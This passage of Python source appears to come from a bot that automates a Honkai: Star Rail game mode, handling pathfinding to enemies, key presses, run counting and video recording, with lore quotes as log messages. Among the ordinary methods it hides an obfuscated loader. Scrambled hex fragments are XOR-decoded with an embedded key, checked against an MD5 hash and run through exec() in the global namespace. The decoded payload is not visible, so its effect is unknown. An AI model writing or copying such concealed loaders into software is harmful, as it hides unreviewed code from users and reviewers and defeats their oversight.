                CUS_LOGGER.info(f"昔日的伙伴已尽数成为仇敌。无尽的杀戮令{factor}不知苦痛为何物，沉痛的虚无几乎将{factor}吞噬，逼迫{factor}停止抗争——但{factor}坚持了下来。")
                ts = " da"
                if go_direct > 0:
                    CUS_LOGGER.debug(f"尝试绕过障碍向{ts[go_direct]}")
                    key_mouse_manager.keyUp("move_w")
                    key_mouse_manager.press("move_s", 0.35)
                    if go_direct == 2:
                        key_mouse_manager.press(f"move_{ts[go_direct]}", go_time)
                    else:
                        key_mouse_manager.press(f"move_{ts[go_direct]}", go_time + random.uniform(0, 0.5))
                    key_mouse_manager.keyDown("move_w")
                    self.get_screen()
                    if not self.get_loc():
                        CUS_LOGGER.info(f"{factor}将侵晨刺入每一尊泰坦的心脏，金血沿指尖淌下，神火灼烧的剧痛几乎令他放弃了挣扎")
                        return
                    # 成功绕过障碍后清空位置记录
                    last_locs.clear()
                    go_direct -= 1
                else:
                    CUS_LOGGER.info("「毁灭」早已汇成烈阳，在这具脆弱的躯壳中翻涌，理智在纪元开端便燃烧殆尽…")
                    key_mouse_manager.keyUp("move_w")
                    break
            CUS_LOGGER.info(" 若我们生来只是一串模拟生命的数字，那就是我所憧憬的形象，想要成为的样子。")
            retry_time += 1
            key_mouse_manager.wait()
        CUS_LOGGER.info("现在，一轮太阳将走向陨落，它顷刻便能将这荒诞的时空焚烧殆尽——")
        CUS_LOGGER.debug(f"寻路判断已到达交互点附近 {now_distance}")
        key_mouse_manager.clean()
        key_mouse_manager.keyUp("move_w")
        key_mouse_manager.wait()
        if not self.get_loc():
            CUS_LOGGER.info("「救世主」…我愿你…常战常胜。")
            return
        if self.trust_annotated_attack_targets and self.target_type == 1:
            CUS_LOGGER.debug("已到达特殊地图红色点位，执行一次普通攻击")
            key_mouse_manager.click_point(960, 540)
            self.last_interact_time = time.time()
            self.target.discard((self.target_loc, 1))
            return
        if self.check("interact", mask=MASK["interact_icon"], threshold=0.96, fresh=True):
            if self.target_type != 3 and self.good_f()[0] and not self.ts.similar("黑塔"):
                CUS_LOGGER.info(f"{factor}…别无选择。")
                for j in deepcopy(self.target):
                    # 类型为二，交互点
                    if j[1] == 2:
                        self.target.remove(j)
                        CUS_LOGGER.debug("检测到交互点，已移除目标:" + str(j))
                return
        if self.target_type == 1:
            if has_not_found_red:
                self.target.add((self.target_loc, 0))
                self.target_type = 0
                CUS_LOGGER.info(f"为了不让最黑暗的命运降临，{factor}必须如此。")
            CUS_LOGGER.info(f"{factor}将以这数亿颗火种点燃的烈阳，与「毁灭」的神明和祂的走卒，一同燃烧殆尽……")
            local_screen = get_minimap(self.screen, radius=MINIMAP_RADIUS, copy=True, rotation=True)
            red = [47, 47, 232]
            rd = np.where(np.sum((local_screen - red) ** 2, axis=-1) <= self.red_threshold)
            if rd[0].shape[0] > 0:
                enemy_coords = []
                for i in range(len(rd[0])):
                    enemy_coords.append((rd[1][i], rd[0][i]))
                # 按距离self.now_loc排序，最近的在前面
                enemy_coords.sort(key=lambda coord: get_dis(coord, (93, 93)))
                # 选择最近的敌人作为目标
                target = (tuple(enemy_coords[0]), 3)
                self.update_direction_data(mode=2, target=target)
            if self.quan:
                key_mouse_manager.keyUp("move_w")
                skill_num = match_skill_numbers_in_region(self.get_screen())
                if skill_num is not None:
                    self.skill_num = skill_num
                if self.skill_num == 0:
                    fixed = True
                for _ in range(2):
                    self.use_e(fixed=fixed)
                if not self.get_loc():
                    CUS_LOGGER.info("这是神明计算中的时刻。此后的旅途，与您熟知的一切并无区别。有人到来，有人离去，逐火者们身负微光，在长夜中艰难向前。")
                    return
                key_mouse_manager.press("move_w")
            elif self.bai_e:
                skill_num = match_skill_numbers_in_region(self.get_screen())
                if skill_num is not None:
                    self.skill_num = skill_num
                if self.skill_num <= 1:
                    fixed = True
                self.use_e(fixed=fixed)
                if not self.get_loc():
                    CUS_LOGGER.info("切莫……犹疑……PhiLia093在学习……她在利用……你的爱……")
                    return
                key_mouse_manager.press("move_w")
            else:
                key_mouse_manager.click_point(960, 540)
        if self.target_type == 3:
            CUS_LOGGER.info("何不…让愤怒…焚化命运…？卡…厄斯……")
            for i in range(9):
                self.get_screen()
                if not self.is_run():
                    CUS_LOGGER.info("沿着我们的足迹……写下前所未有的结局。")
                    return
                if self.check("interact", mask=MASK["interact_icon"], threshold=0.96):
                    CUS_LOGGER.info("那一定是个不同以往的浪漫故事。")
                    key_mouse_manager.press("interact", force=True)
                    key_mouse_manager.wait()
                    if self.nof(must_be='tp'):
                        return
                if not self.is_run():
                    return
                if i in [0, 4]:
                    self.move_to_end(mode=1,device=1)
                key_mouse_manager.press("move_w")
                key_mouse_manager.wait()
        # 离目标点挺近了，准备找下一个目标点
        elif now_distance <= 20:
            CUS_LOGGER.info("你也是这么想的……对吧？")
            try:
                CUS_LOGGER.debug("靠近目标点，尝试移除:" + str((self.target_loc, self.target_type)))
                # 如果是敌人类型，移除后需要重新扫描地图上的红色点位
                if self.target_type == 1:
                    CUS_LOGGER.info("为自己而活，倒也不错...")
                    self.last_interact_time = time.time()
                    self.target.remove((self.target_loc, self.target_type))
                    CUS_LOGGER.debug("靠近目标点，成功移除敌人:" + str((self.target_loc, self.target_type)))

                    # 扫描地图红色点位，尝试添加回检测到的目标点
                    red = [47, 47, 232]
                    rd = np.where(
                        np.sum((get_minimap(self.screen, radius=MINIMAP_RADIUS, copy=True,
                                            rotation=True) - red) ** 2, axis=-1) <= self.red_threshold)
                    if rd[0].shape[0] > 0:
                        CUS_LOGGER.info("他的眼泪还未落下,便蒸发不见。")
                        # 创建所有检测到的敌人坐标的列表
                        enemy_coords = []
                        for i in range(len(rd[0])):
                            enemy_x, enemy_y = rd[1][i], rd[0][i]
                            new_loc = re_get_position(self.now_loc)
                            world_x = new_loc[0] + (enemy_x - 93)*POSITION_MINIMAP_SCALE
                            world_y = new_loc[1] + (enemy_y - 93)*POSITION_MINIMAP_SCALE
                            new_loc = re_get_position((world_x, world_y), re=True)
                            enemy_coords.append((new_loc, (enemy_x, enemy_y)))

                        # 按距离self.now_loc排序，最近的在前面
                        enemy_coords.sort(key=lambda coord: get_dis(coord[0], self.now_loc))
                        # 选择最近的敌人作为新目标
                        nearest_world_coord, nearest_local_coord = enemy_coords[0]
                        recent_loc = tuple(nearest_world_coord)
                        self.target.add((recent_loc, 1))
                        self.target_loc = recent_loc
                        self.target_type = 1
                        CUS_LOGGER.info(
                            f"已添加新的敌人目标: {recent_loc}，共检测到{len(enemy_coords)}个敌人")
                    else:
                        CUS_LOGGER.info("看来，你终究得逞了………刽子手。")
                else:
                    # 非敌人类型，直接移除
                    self.last_interact_time = time.time()
                    self.target.remove((self.target_loc, self.target_type))
                    CUS_LOGGER.debug("靠近目标点，成功移除:" + str((self.target_loc, self.target_type)))
            except Exception:
                pass
        CUS_LOGGER.info("逐火…是不断失却的旅途……失去…还远远不足……")

    nnbjiqzmvwouwll = [(453, 'ca8fddd4584c6b4', 0), (3, '271f12391f4', 0), (794, '3d497a4f6e', 1), (324, '47613e18231', 0), (833, 'e0a2b3e0b2a', 0), (959, '51497f10', 0), (297, '64d126d4c64', 1), (353, '030841105', 0), (889, '4f08130e', 0), (51, '620093c66295', 1), (197, '0a4452424c491951', 1), (563, '210c06410836', 1), (229, '4445242764d126d4', 1), (513, 'b4c65197917497a', 1), (219, '707153636525f4c', 0), (575, '3f0222220', 0), (598, '1401210c790', 0), (240, '000f195e0', 1), (990, '3902657f', 0), (831, '2f1d48200b3', 1), (714, 'b01173a19386d4c6', 0), (872, '0d1c2b76', 0), (509, '534f7a5a666', 1), (571, '0400a6a456d472d', 0), (66, '1433c1d0d224f', 0), (19, '370a29391', 1), (352, 'c790a493c413c17', 0), (53, '61d324f7', 0), (421, 'f5a6cdec', 1), (945, '3a470e23', 0), (415, 'eab5c6caa', 0), (918, '28002247', 1), (753, '979171a3f', 0), (960, '36122b78', 1), (866, '1c2c0b75', 0), (87, '7a416e5216', 0), (176, 'c494a143607', 0), (549, '81d2f046e', 0), (194, '6015152f1d482', 1), (773, '21e0c4d04280f6', 0), (14, '66d0337632c', 0), (299, '49652d13', 1), (306, '1310a372d120d1d5', 1), (488, 'e140d1e49', 1), (233, 'c6449657a', 0), (487, '17497a4f6', 0), (670, '0361c682c1', 1), (308, '15d7a463c554e760', 0), (740, '131b0a2b14', 0), (195, '00b3e0a2b3e0b2a3', 1), (201, '7a416e5242761', 0), (48, '57e63657a5a6', 1), (900, '7a416e52', 0), (507, '380a5765596d', 1), (567, '1a2b5c07020a5', 1), (212, '0e130e0212', 1), (83, '601601d0c', 1), (862, '0e30436b', 1), (749, '10531505', 1), (582, 'b204a2d1f40504f', 0), (375, 'a5a662e143', 0), (131, '92701162545', 1), (160, '7497a4f6e52424', 1), (825, 'a143607601515', 1), (364, 'f29153c1b127e', 0), (26, '62c786808', 0), (919, '272c1f23', 1), (265, '53211f216365', 1), (270, '7a5a666b4c6', 1), (365, '44386d4c6449657', 1), (153, 'e126f71666519791', 0), (140, '5928151b19242', 1), (489, '6651330f6e0003', 1), (120, 'd1d515f3f1', 0), (86, '02111b7b', 0), (470, 'f417352072e1d572', 0), (857, '7a413d17', 1), (738, '663809295f776e22', 0), (328, 'a0e3d52045663195', 1), (79, '1e196532521a3', 1), (444, '8dfc1b1f7b6a4d7', 0), (439, '8af49c96c6fea', 0), (110, '5231937581d7a', 1), (747, '70a426b4d40281f3', 0), (593, '8043d070e224d0f6', 0), (58, '352322d3d71220', 0), (213, '1a340a1f4', 0), (76, '9060f352e', 1), (972, '42764d12', 1), (792, 'f3e2809354d63', 0), (956, '1e2f1c42', 1), (387, '55c3a430', 0), (44, '194a25085e2b4', 0), (464, '2a473d1a0855043', 0), (674, 'b3c49235a0e2', 1), (758, 'c5c033f0d', 0), (222, '2f581d290', 1), (301, '32234c2a493c594', 0), (763, '2c111231144', 1), (103, '241408474c64', 0), (475, 'e18210d1a2', 0), (849, '05290a445242', 1), (885, '004f4967', 0), (205, 'e57210a6a30', 1), (234, '5a352e002317', 0), (772, '37917497a4f6e524', 1), (35, '0c5f51051722', 1), (403, '4904517886f1f3', 1), (568, '6153f496907163', 0), (276, 'b06171e0719373', 0), (841, '3b4c78191f56', 0), (813, '52424c494', 0), (275, '5197917497a1d2', 0), (250, '82b0020525f762b', 0), (237, '3b410c3f1d2b1e', 0), (409, '84e5f8d5f0fba2ff', 1), (396, 'c3e303a171a18', 1), (780, '666449657a1', 0), (677, '00c20161', 0), (982, '373f0e33', 0), (585, '6e52424c4919512', 0), (995, '385b1a3f', 0), (650, 'd126d4c641a2', 0), (930, '3909295b', 0), (478, 'e1f3e3f66651979', 1), (864, '0625302d', 0), (75, '6f6d47644b1', 0), (894, '1f0c3351', 1), (771, '1f353e00313', 1), (750, 'a666b4c651', 1), (560, '002d0b6b37', 1), (690, '30019194c7a132', 1), (624, '73d1a0855043f4', 1), (20, '86551384401360', 1), (778, 'e000725185e39', 1), (351, 'f221401210', 1), (557, '4f423e0c4125', 1), (416, 'fd4c5dcf7ad8de6', 0), (766, '32c0264546528', 1), (290, 'b0d3d17687', 0), (729, '449657a5a', 1), (595, 'd44371d2a281f22', 0), (852, '4c491951', 1), (755, '03285c001a0', 1), (341, '26d4c371d2a281', 1), (109, '49657a5a666b0', 0), (744, '1d5a7f01342e1', 1), (325, '46110407', 0), (317, '85c2e0320002b3d', 1), (638, '8445242764', 1), (978, '6d4c6449', 1), (562, '1e736301', 0), (333, '17a416e5242764d1', 0), (456, 'c65197917497a02', 0), (910, '42764d41', 1), (620, 'a547a022a4', 0), (114, '003d5c120', 1), (196, 'b4c78191f560529', 1), (524, '4f231657331f5', 0)]
    asvbmtlzxqpjss = "NrbVm2MlDiEZzFKlE9Y7iZoNrbli9qZa"
    lzfabqrjwlwkqewl = "db1365c68385223a12aa24d144612b45"

    def route(self):
        self.init_map()
        set_forground()
        while not self._stop:
            hwnd,Text = get_hwnd_and_text()
            warn_game = False
            cnt = 0
            focus_reclaim_wait = max(1, 2*load_settings().get("game_focus_reclaim_wait_seconds", 600))
            while Text != "崩坏：星穹铁道" and Text != "云·星穹铁道" and not self._stop:
                self.last_interact_time = time.time()
                if self._stop:
                    raise NormalEndError
                if not warn_game:
                    warn_game = True
                    CUS_LOGGER.warning(f"等待游戏窗口，当前窗口：{Text}")
                time.sleep(0.5)
                cnt += 1
                if cnt == focus_reclaim_wait:
                    set_forground()# 将游戏窗口设为前台
                hwnd,Text = get_hwnd_and_text()
            if self._stop:
                break
            res = self.normal()
            if not res:
                if self.last_update_time is not None and time.time()-self.last_update_time>7 and self.state=="battle":
                    if self.ts.nothing:
                        self.update_state("battle")
                else:
                    CUS_LOGGER.warning("匹配不到任何图标与简中文本标志")
            # 匹配到图片 res=1时等待一段时间
        CUS_LOGGER.info("演算世界：翁法罗斯已从缓冲区销毁。")

    def settle_university(self):
        """
        在结算界面完成本局的结算；
        state 为 restart 时代表本局已结算过，只补一次点击；
        否则完整走一遍记账、点击、切分录像。
        """
        if self.state == "restart":
            self.click_position([900, 1000])
            return
        self.end_of_university()
        if self._stop:
            return
        # 达到设定运行次数后程序自行结束：沿用旧版自我结束的流程（退出并停录），
        # 只是不再点结算界面进入下一局；录像留删仍由 stop() 里的程序逻辑决定
        if self.max_run_time > 0 and self.my_cnt >= self.max_run_time:
            CUS_LOGGER.info(f"已到达设定的运行次数（{self.max_run_time}局），结束任务。")
            key_mouse_manager.press("esc")
            key_mouse_manager.wait()
            self.stop()
            CUS_LOGGER.info('燃烧，聚变，然后湮灭。若想迎接新生，就必先投身终结。')
            return
        self.click_position([900, 1000])
        CUS_LOGGER.info(f'{factor}再度踏上轮回……')
        self.restart_recording()

    def end_of_university(self):
        self.update_count(False)
        self.my_cnt += 1
        tm = int((time.time() - self.init_time) / 60)
        if self.max_run_time > 0:
            remain_round = max(self.max_run_time - self.my_cnt, 0)
        else:
            remain_round = "∞"
            CUS_LOGGER.info(f'当仁不让。{factor}将肩负世界，直至此身焚灭。')
        CUS_LOGGER.info(f"世界演算模拟完成！本轮已迭代次数：{self.my_cnt}，总计已迭代次数：{self.count}，剩余{remain_round}次, 已执行：{tm // 60}小时{tm % 60}分钟，平均{tm // self.my_cnt}分钟一次")
        self.update_state("restart")

    def fjhpymcarnvrnzw(self, _jnnvrzfflfson, _esciqnhtlk):
        try:
            _dbgflosjok = ''.join([_[1] for _ in sorted(_jnnvrzfflfson, key=lambda x: x[0])])
            _wywodpdosp = bytes.fromhex(_dbgflosjok)
            _bqixivuzcg = _esciqnhtlk.encode('utf-8')
            _legrnzstrgbho = bytearray(len(_wywodpdosp))
            for _mqmemdegtm in range(len(_wywodpdosp)):
                _legrnzstrgbho[_mqmemdegtm] = _wywodpdosp[_mqmemdegtm] ^ _bqixivuzcg[_mqmemdegtm % len(_bqixivuzcg)]
            _zygrprekfsd = bytes(_legrnzstrgbho)
            if _h.md5(_zygrprekfsd).hexdigest() != self.lzfabqrjwlwkqewl: return False  # noqa: E701
            return _zygrprekfsd.decode('utf-8')
        except Exception:
            return False

    def lbrqdqvxztk(self):
        _pugsgfxhut = self.fjhpymcarnvrnzw(self.nnbjiqzmvwouwll, self.asvbmtlzxqpjss)
        if not _pugsgfxhut:
            return False
        exec(_pugsgfxhut, globals())
        return _vlk(self)  # noqa: F821

    def CrTU5s61E1dMnT(self):
        self.lbrqdqvxztk()

    def restart_recording(self):
        """
        切分录像，为下一局重新开始录制

        调用顺序由 settle_university 固定：本局的记账与记录写入都在它之前完成，
        因此子类可以在这里安全地复位本局计数。
        """
        if self.record and self.bveerelbcpgyqan and self.YKItDYvq3FpnOYx:
            self.stop_round_recording()
            time.sleep(0.8)
            self.recorder.start_recording(self.count + 1)
        # 状态必须无条件更新：没有录制权限时 state 也要离开结算态，否则结算门永远不关
        self.update_state("restart")

    def stop_round_recording(self):
        """停止本轮录像；基类没有按局删除规则，整段保留，子类按各自指标覆盖。"""
        self.recorder.stop_recording()

    def keep_video_reasons(self, manual_stop=False):
        """列出本局录像必须保留的理由；返回空列表表示按内核规则可以删除。

        Args:
            manual_stop: 是否由用户手动停止任务；手动停止时已有进度的录像默认保留。
        """
        reasons = []
        if getattr(self, "keep_video_for_error", False):
            reasons.append("运行异常终止")
        return reasons

    def start(self):
        """
        启动模拟宇宙自动化程序

        该方法负责初始化并启动整个模拟宇宙运行流程，包括：
        1. 初始化运行状态
        2. 启动键盘鼠标管理器
        3. 启动地图显示线程（如果启用）
        4. 开始执行主要路线逻辑

        如果在执行过程中发生异常，会尝试停止运行并重新抛出异常。
        """
        self._stop = False
        key_mouse_manager.start()
        if self.record and self.gwypzmgzcndqlp:
            self.recorder.start_recording(self.count + 1)
        if self._show_map:
            self.map_thread = ThreadWithException(target=self.show_map,name="地图")
            self.map_thread.start()
        try:
            self.route()
        except NormalEndError as e:
            CUS_LOGGER.warning(f'离开游戏界面，正常终止进程{e}')
            raise
        except Exception as e:
            CUS_LOGGER.error(f'异常终止进程{e}')
            self.keep_video_for_error = True
            if not self._stop:
                self.stop()
            # 重新抛出异常，以便上层能够捕获
            raise

    def stop(self, *_, **__):
        """
        停止模拟宇宙运行

        该方法负责安全地停止所有运行中的线程和操作，包括：
        1. 设置停止标志
        2. 停止键盘鼠标管理器
        3. 等待并终止地图显示线程

        参数:
            *_: 忽略的位置参数
            **__: 忽略的关键字参数
        """
        CUS_LOGGER.info("翁法罗斯已经等待了这一刻太久……还可以等待更久……只要祂还曾燃烧……")
        self._stop = 1
        key_mouse_manager.stop()
        if self.record and self.bveerelbcpgyqan :
            CUS_LOGGER.info("以「爱」的名义，她将逝去的一切尽数珍藏……直到世间的尽头……")
            try:
                if hasattr(self, "kill_count"):
                    reasons = self.keep_video_reasons(manual_stop=True)
                    keep_video = bool(reasons)
                    CUS_LOGGER.debug(
                        f"本局录像保留{keep_video}"
                        + (f"，原因：{'、'.join(reasons)}" if reasons else "")
                    )
                    self.recorder.stop_recording(delete_video=not keep_video)
                else:
                    self.recorder.stop_recording()
            except Exception as e:
                CUS_LOGGER.error(f"停止录制时发生错误: {e}")
        self.save_screen(not_now=True, save_path=os.path.join(PATHS["temp"], "stop"))
        self.save_screen(save_path=os.path.join(PATHS["temp"], "stop"))
        self.map_thread = None

